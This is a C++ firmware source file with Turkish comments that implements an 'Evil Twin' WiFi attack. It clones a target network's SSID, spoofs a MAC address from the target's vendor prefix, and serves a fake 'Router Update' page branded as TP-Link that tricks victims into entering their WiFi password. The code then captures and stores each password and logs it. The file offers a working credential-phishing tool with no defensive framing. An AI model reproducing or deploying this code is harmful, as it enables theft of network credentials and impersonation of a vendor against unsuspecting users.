#include "CaptivePortal.h"
#include "WiFi.h"
#include "debug.h"

// === HTML Sayfaları (PROGMEM) ===
// RAM tasarrufu için flash bellekte saklanır

// Ana yakalama sayfası (Yönlendirici Güncelleme)
const char CaptivePortal::PAGE_INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Router Update</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;text-align:center;margin-top:50px}
.card{background:white;max-width:350px;margin:auto;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{font-size:24px;font-weight:bold;color:#1a73e8;margin-bottom:20px}
.warning{color:#d93025;font-size:14px;margin-bottom:20px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer}
button:hover{background:#1557b0}
.footer{font-size:12px;color:#888;margin-top:20px}
</style></head>
<body>
<div class="card">
<div class="logo">Router &#9881; Update</div>
<div class="warning">Yönlendirici yazılım güncellemesi gerekiyor<br>Bağlantıyı sürdürmek için WiFi şifrenizi girin</div>
<form method="POST">
<input type="password" name="password" placeholder="WiFi Şifrenizi Girin" autofocus required>
<button type="submit">Güncelle</button>
</form>
<div class="footer">TP-Link Technologies &copy; 2024</div>
</div></body></html>
)rawliteral";

// Teşekkür sayfası
const char CaptivePortal::PAGE_THANKYOU_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset="UTF-8">
<meta http-equiv="refresh" content="5;url=http://google.com">
<title>Güncelleme Başarılı</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;text-align:center;margin-top:80px}
.card{background:white;max-width:350px;margin:auto;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.check{font-size:48px;color:#34a853;margin-bottom:10px}
</style></head>
<body><div class="card">
<div class="check">&#10003;</div>
<h2>Güncelleme Başarılı</h2>
<p>Yönlendiriciniz başarıyla güncellendi.<br>Yönlendirici yeniden başlatılıyor...</p>
<p style="font-size:12px;color:#888">5 saniye içinde yönlendirileceksiniz</p>
</div></body></html>
)rawliteral";


// === Yapıcı ve Başlatıcı ===

CaptivePortal::CaptivePortal() : _server(CAPTIVE_PORTAL_PORT) {
    // Yapıcı: Değişkenleri başlangıç durumuna ayarla
}

void CaptivePortal::begin() {
    // Başlatma: Durum değişkenlerini sıfırla
    _running = false;
    _capturedCount = 0;
    _nextCaptureIndex = 0;
    _clientConnected = false;
    _clientCount = 0;
    // MAC adresi için rastgele sayı üretecini başlat
    srand(micros());
}

// === Ana Kontrol Fonksiyonları ===

bool CaptivePortal::start(const char* targetSSID, uint8_t* targetBSSID, uint8_t channel) {
    // Evil Twin saldırısını başlat
    strncpy(_targetSSID, targetSSID, sizeof(_targetSSID) - 1);
    _targetSSID[sizeof(_targetSSID) - 1] = '\0';
    _channel = channel;

    if (targetBSSID != NULL) {
        memcpy(_targetBSSID, targetBSSID, 6);
    } else {
        memset(_targetBSSID, 0, 6);
    }

    // Yakalanan şifreleri sıfırla
    _capturedCount = 0;
    _nextCaptureIndex = 0;
    for (int i = 0; i < MAX_CAPTURED_PASSWORDS; ++i) {
        _capturedPasswords[i].displayed = true;
    }

    _generateCloneMAC();
    _startAP();

    _server.begin();
    _running = true;
    
    // Periyodik deauth için zamanlayıcıyı ayarla
    _deauthIntervalMs = 5000;
    _lastDeauthMs = millis();

    DBG_PRINTF("Captive Portal baslatildi: SSID='%s', Kanal=%d\n", _targetSSID, _channel);
    return true;
}

void CaptivePortal::stop() {
    // Evil Twin saldırısını durdur
    if (!_running) return;

    _running = false;
    _server.stop();
    
    if (_currentClient && _currentClient.connected()) {
        _currentClient.stop();
    }
    _clientConnected = false;

    // RTL8720DN: AP'yi durdurmak icin dogrudan API yoktur.
    // WiFi.disconnect() en azindan STA arayuzunu kapatir.
    WiFi.disconnect();
    _clientCount = 0;
    DBG_PRINTF("Captive Portal durduruldu.\n");
}

bool CaptivePortal::isRunning() {
    return _running;
}

void CaptivePortal::update() {
    // Her döngüde çağrılan ana güncelleme fonksiyonu
    if (!_running) return;

    // Bağlı istemci sayısını güncelle
    // RTL8720DN: softAPgetStationNum() yok, simdilik 0
    _clientCount = 0;

    // Periyodik deauth için yer tutucu (gerçek deauth WiFiAttacks'ta)
    if (millis() - _lastDeauthMs > _deauthIntervalMs) {
        _lastDeauthMs = millis();
        // Serial.println("[Captive] Periyodik deauth tetiklendi (placeholder).");
    }

    // Mevcut bir istemci varsa, bağlantıyı kes ve yenisini kabul etmeye hazır ol
    if (_clientConnected && !_currentClient.connected()) {
        _currentClient.stop();
        _clientConnected = false;
        DBG_PRINTF("Istemci baglantisi kesildi.\n");
    }

    // Yeni istemci bağlantılarını kontrol et
    if (!_clientConnected) {
        WiFiClient client = _server.available();
        if (client) {
            _currentClient = client;
            _clientConnected = true;
            _clientTimeoutMs = millis() + 2000;
            DBG_PRINTF("Yeni istemci baglandi.\n");
        }
    }

    // Bağlı istemciyi işle
    if (_clientConnected) {
        _handleClient();
    }
}

// === Şifre Yakalama ve Yönetimi ===

int CaptivePortal::getCapturedCount() {
    return _capturedCount;
}

const CapturedCredential* CaptivePortal::getCaptured(int index) {
    if (index < 0 || index >= _capturedCount) return nullptr;
    return &_capturedPasswords[index];
}

CapturedCredential* CaptivePortal::getNewCaptured() {
    // Görüntülenmemiş ilk şifreyi bul
    for (int i = 0; i < _capturedCount; ++i) {
        if (!_capturedPasswords[i].displayed) {
            return &_capturedPasswords[i];
        }
    }
    return nullptr;
}

bool CaptivePortal::hasNewCapture() {
    // Görüntülenmemiş yeni bir şifre var mı kontrol et
    for (int i = 0; i < _capturedCount; ++i) {
        if (!_capturedPasswords[i].displayed) {
            return true;
        }
    }
    return false;
}

void CaptivePortal::markDisplayed(int index) {
    if (index >= 0 && index < _capturedCount) {
        _capturedPasswords[index].displayed = true;
    }
}

int CaptivePortal::getClientCount() {
    return _clientCount;
}

// === Dahili Yardımcı Fonksiyonlar ===

void CaptivePortal::_startAP() {
    DBG_PRINTF("Klon AP MAC: ");
    for(int i=0; i<6; ++i) {
        DBG_PRINTF("%02X", _apMAC[i]);
        if(i<5) DBG_PRINTF(":");
    }
    DBG_PRINTF("\n");

    // RTL8720DN: apbegin() ile AP baslat
    uint8_t mac[6];
    WiFi.macAddress(mac);
    memcpy(_apMAC, mac, 6);

    char chStr[4];
    snprintf(chStr, sizeof(chStr), "%d", _channel);
    WiFi.apbegin(_targetSSID, chStr);

    IPAddress apIP = WiFi.localIP(1);
    char ipBuf[16];
    snprintf(ipBuf, sizeof(ipBuf), "%d.%d.%d.%d", apIP[0], apIP[1], apIP[2], apIP[3]);
    DBG_PRINTF("AP baslatildi. IP: %s\n", ipBuf);
}

// URL-encoded string'i çözen basit bir yardımcı
void urlDecode(char* dst, const char* src) {
    char a, b;
    while (*src) {
        if ((*src == '%') &&
            ((a = src[1]) && (b = src[2])) &&
            (isxdigit(a) && isxdigit(b))) {
            if (a >= 'a') a -= 'a'-'A';
            if (a >= 'A') a -= ('A' - 10);
            else a -= '0';
            if (b >= 'a') b -= 'a'-'A';
            if (b >= 'A') b -= ('A' - 10);
            else b -= '0';
            *dst++ = 16*a + b;
            src+=3;
        } else if (*src == '+') {
            *dst++ = ' ';
            src++;
        } else {
            *dst++ = *src++;
        }
    }
    *dst++ = '\0';
}

void CaptivePortal::_handleClient() {
    // HTTP isteğini işle
    if (!_currentClient.available()) {
        // Zaman aşımı kontrolü
        if (millis() > _clientTimeoutMs) {
            DBG_PRINTF("Istemci zaman asimi.\n");
            _currentClient.stop();
            _clientConnected = false;
        }
        return;
    }

    // HTTP isteğini oku
    String req = _currentClient.readStringUntil('\r');
    _currentClient.flush();

    // İstek türünü parse et (GET/POST)
    bool is_post = req.indexOf("POST /") != -1;
    
    // Host başlığını bul (captive portal tespiti için)
    String host = "";
    String line;
    while(_currentClient.available()) {
        line = _currentClient.readStringUntil('\r');
        if (line.startsWith("Host: ")) {
            host = line.substring(6);
        }
        if (line.length() == 1 && line[0] == '\n') { // Header sonu
            break;
        }
    }

    if (is_post) {
        // POST isteği - şifre gönderildi
        String body = _currentClient.readString();
        int pass_idx = body.indexOf("password=");
        if (pass_idx != -1) {
            String pass_encoded = body.substring(pass_idx + 9);
            char password[MAX_PASSWORD_LENGTH];
            urlDecode(password, pass_encoded.c_str());
            _storePassword(password);
            _serveThankYouPage(_currentClient, password);
        }
    } else {
        // GET isteği
        if (_isRedirectRequest(host)) {
            // Captive portal tespiti veya dış siteye erişim denemesi
            _serveRedirectPage(_currentClient);
        } else {
            // Ana sayfayı sun
            _serveCaptivePortalPage(_currentClient);
        }
    }
    
    // İstemciyi kapat
    delay(10); // Verinin gönderilmesi için kısa bir bekleme
    _currentClient.stop();
    _clientConnected = false;
    DBG_PRINTF("Istek islendi, istemci kapatildi.\n");
}

void CaptivePortal::_serveCaptivePortalPage(WiFiClient& client) {
    // Ana "Router Update" sayfasını istemciye gönder
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"));
    client.print(PAGE_INDEX_HTML);
}

void CaptivePortal::_serveThankYouPage(WiFiClient& client, const char* password) {
    // "Teşekkürler" sayfasını gönder
    client.print(F("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"));
    client.print(PAGE_THANKYOU_HTML);
}

void CaptivePortal::_serveRedirectPage(WiFiClient& client) {
    // Cihazın captive portalı algılaması için yönlendirme yap
    client.print(F("HTTP/1.1 302 Found\r\nLocation: http://192.168.4.1/\r\nConnection: close\r\n\r\n"));
}

void CaptivePortal::_storePassword(const char* password) {
    // Yakalanan şifreyi dairesel arabellekte sakla
    int index = _nextCaptureIndex;
    
    strncpy(_capturedPasswords[index].ssid, _targetSSID, sizeof(_capturedPasswords[index].ssid) - 1);
    _capturedPasswords[index].ssid[sizeof(_capturedPasswords[index].ssid) - 1] = '\0';
    
    strncpy(_capturedPasswords[index].password, password, MAX_PASSWORD_LENGTH - 1);
    _capturedPasswords[index].password[MAX_PASSWORD_LENGTH - 1] = '\0';
    
    _capturedPasswords[index].capturedAt = millis();
    _capturedPasswords[index].displayed = false;

    if (_capturedCount < MAX_CAPTURED_PASSWORDS) {
        _capturedCount++;
    }
    
    _nextCaptureIndex = (_nextCaptureIndex + 1) % MAX_CAPTURED_PASSWORDS;

    DBG_PRINTF("SIFRE YAKALANDI! SSID: %s, Sifre: %s\n", _targetSSID, password);
}

bool CaptivePortal::_isRedirectRequest(const String& host) {
    // Captive portal tespit URL'lerini kontrol et
    if (host.indexOf("192.168.4.1") == -1) {
        // Apple, Google, Microsoft captive portal tespit istekleri veya
        // herhangi bir dış siteye yapılan istekler buraya düşer.
        DBG_PRINTF("Yonlendirme istegi: Host=%s\n", host.c_str());
        return true;
    }
    return false;
}

void CaptivePortal::_generateCloneMAC() {
    // Klonlanmış AP için sahte bir MAC adresi oluştur
    if (_targetBSSID[0] != 0 || _targetBSSID[1] != 0 || _targetBSSID[2] != 0) {
        // Hedef BSSID varsa, OUI'yi kopyala
        memcpy(_apMAC, _targetBSSID, 3);
        // Son 3 byte'ı rastgele ata
        _apMAC[3] = random(0, 256);
        _apMAC[4] = random(0, 256);
        _apMAC[5] = random(0, 256);
        // Yerel olarak yönetilen bit'i ayarla (çakışmaları önlemek için)
        _apMAC[0] |= 0x02;  // Set local bit
        _apMAC[0] &= 0xFE;  // Unset multicast bit
    } else {
        // Hedef BSSID yoksa, tamamen rastgele bir MAC oluştur
        _apMAC[0] = 0x02; // Yerel olarak yönetilen MAC
        _apMAC[1] = random(0, 256);
        _apMAC[2] = random(0, 256);
        _apMAC[3] = random(0, 256);
        _apMAC[4] = random(0, 256);
        _apMAC[5] = random(0, 256);
    }
}
